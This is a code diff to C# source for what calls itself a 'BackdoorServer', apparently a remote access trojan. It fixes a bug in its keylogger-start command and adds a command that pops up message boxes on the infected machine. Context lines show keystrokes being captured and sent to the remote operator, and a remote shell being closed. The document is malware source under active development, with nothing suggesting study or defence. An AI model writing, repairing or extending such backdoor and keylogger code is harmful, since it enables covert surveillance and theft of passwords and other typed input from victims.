@@ -148,7 +148,7 @@ namespace BackdoorServer {
 						keylogger.Dump();
 					}
 					keylogger = new KeyLogger();
-					keyloggerThread = new Thread(new ThreadStart(kl.Start));
+					keyloggerThread = new Thread(new ThreadStart(keylogger.Start));
 					keyloggerThread.Start();
 					break;
 				case RatAction.KEYLOGGER_DUMP:
@@ -158,6 +158,25 @@ namespace BackdoorServer {
 					outStream.WriteLine("Captured input:");
 					outStream.WriteLine(dump);
 					break;
+                case RatAction.SHOW_MESSAGE:
+                    if(verbose) Console.WriteLine("Show message mode");
+                    outStream.WriteLine("Title:");
+                    string title = inStream.ReadLine();
+                    outStream.WriteLine("Content");
+                    string content = inStream.ReadLine();
+                    
+                    outStream.WriteLine(String.Format("Do you really want to show message:\r\n=========\r\n{0}\r\n========\r\n{1}\r\n\r\n[Y/N]",title,content));
+                    string response = inStream.ReadLine();
+                    if (response.Equals("y"))
+                    {
+                        outStream.WriteLine("Message shown");
+                        new Thread(delegate() { MessageBox.Show(content, title, MessageBoxButtons.OK);}).Start();
+                        Console.WriteLine("Message shown");
+                    } else{
+                        Console.WriteLine("Message denied");
+                        outStream.WriteLine("MessageBox showing denied by the user");
+                    }
+                    break;
 				case RatAction.QUIT:
 					outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
 					CloseShell();
